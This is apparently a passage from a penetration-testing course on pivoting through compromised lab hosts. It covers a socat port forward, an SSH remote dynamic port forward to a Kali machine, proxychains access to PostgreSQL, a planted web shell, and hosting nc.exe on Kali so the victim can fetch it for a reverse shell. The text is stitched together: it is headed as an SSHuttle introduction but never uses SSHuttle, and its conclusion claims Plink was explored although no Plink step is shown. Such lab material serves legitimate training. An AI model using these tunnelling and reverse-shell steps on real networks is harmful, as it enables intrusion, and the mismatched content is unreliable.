### Introduction to SSHuttle

SSHuttle is a tool that transforms an SSH connection into a mechanism similar to a Virtual Private Network (VPN) by setting up local routes that force traffic through the SSH tunnel. However, it requires root privileges on the SSH client and Python3 on the SSH server, making it not always the most lightweight solution. In the right scenario, however, it can be very useful.

### Lab Environment Setup

In our lab environment, we have SSH access to `PGDATABASE01`, which we can access through a port forward set up on `CONFLUENCE01`. Let's use SSHuttle to observe its capabilities.

#### Step 1: Setting Up a Port Forward

First, we set up a port forward in a shell on `CONFLUENCE01`, listening on port 2222 on the WAN interface and forwarding to port 22 on `PGDATABASE01`.

```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```

#### Step 2: Verifying SSH Availability

Next, we verify that `ssh.exe` is available on `MULTISERVER03` and check its version.

```bash
C:\Users\rdp_admin> where ssh
C:\Windows\System32\OpenSSH\ssh.exe

C:\Users\rdp_admin> ssh -V
OpenSSH_for_Windows_8.1p1, LibreSSL 3.0.2
```

The version of OpenSSH bundled with Windows is higher than 7.6, allowing us to use it for remote dynamic port forwarding.

#### Step 3: Creating a Remote Dynamic Port Forward

We create a remote dynamic port forward to our Kali machine, passing port 9998 to `-R` and authenticating as `kali` back on our Kali machine.

```bash
C:\Users\rdp_admin> ssh -N -R 9998 kali@192.168.118.4
```

Upon connecting, you will be prompted to confirm the host key and enter the password for the `kali` user.

#### Step 4: Verifying the SOCKS Proxy Port

We can check that the SOCKS proxy port is open on our Kali machine using the `ss` command.

```bash
kali@kali:~$ ss -ntplu
Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process
tcp LISTEN 0 128 127.0.0.1:9998 0.0.0.0:*
tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:*
tcp LISTEN 0 128 [::1]:9998 [::]:*
tcp LISTEN 0 128 [::]:22 [::]:*
```

#### Step 5: Configuring Proxychains

Update `/etc/proxychains4.conf` to use the newly created SOCKS port.

```bash
kali@kali:~$ tail /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 9998
```

#### Step 6: Connecting to the PostgreSQL Database

Now that the configuration file points to our remote dynamic port forward SOCKS port, we can run `psql` through `proxychains` to connect to the PostgreSQL database as the `postgres` user.

```bash
kali@kali:~$ proxychains psql -h 10.4.50.215 -U postgres
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain ... 127.0.0.1:9998 ... 10.4.50.215:5432 ... OK
Password for user postgres:
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.
postgres=# \l
List of databases
Name | Owner | Encoding | Collate | Ctype | Access privileges
------------+----------+----------+-------------+-------------+-----------------------
confluence | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 |
postgres | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 |
template0 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres +
| | | | | postgres=CTc/postgres
template1 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres +
| | | | | postgres=CTc/postgres
(4 rows)
postgres=#
```

### Using Plink for Remote Port Forwarding

Administrators may prefer to avoid leaving OpenSSH on their Windows machines, so we cannot always rely on finding an OpenSSH client. Even if we are on a recent version of Windows, network administrators may have removed it. However, they still need remote administration tools, and PuTTY and its command-line counterpart, Plink, are popular choices.

#### Benefits of Using Plink

One advantage of using tools like Plink is that they are less likely to be flagged by traditional antivirus software, making them appealing to attackers. Plink supports many of the features offered by the OpenSSH client, though it lacks remote dynamic port forwarding.

#### Scenario: Compromising MULTISERVER03

In this scenario, `MULTISERVER03` has a web application on TCP port 80 exposed, with all other inbound ports blocked by a firewall. We can compromise `MULTISERVER03` through the web application, drop a web shell, and gain a reverse shell. We have credentials to connect to the RDP service, but it is blocked by the firewall. The OpenSSH client has also been removed, so we can't create a remote port forward using it.

Instead, we can create a remote port forward using Plink.

#### Step 1: Getting an Interactive Reverse Shell

From our initial exploitation, we uploaded a basic web shell at `/umbraco/forms.aspx`. We can browse to this URL and run Windows commands as the `iis apppool\defaultapppool` user. We can use this web shell to download `nc.exe` to `MULTISERVER03`, which we will then use to send a reverse shell back to our Kali machine.

#### Step 2: Hosting `nc.exe` on Kali

To download `nc.exe` onto `MULTISERVER03`, we first need to host it on a server that `MULTISERVER03` can access. We can configure Apache2 on our Kali machine to do this.

```bash
kali@kali:~$ sudo systemctl start apache2
[sudo] password for kali:
```

We then find `nc.exe` from our Kali `windows-resources/binaries` directory and copy it to the Apache2 web root.

```bash
kali@kali:~$ cp /path/to/nc.exe /var/www/html/
```

Now, `nc.exe` is available for download from `http://<Kali-IP>/nc.exe`.

### Conclusion

In this section, we set up a connection to a PostgreSQL database running on a Linux server through an SSH remote dynamic port forward made between a Windows SSH client and our Kali machine SSH server. We also explored using Plink for remote port forwarding when OpenSSH is not available.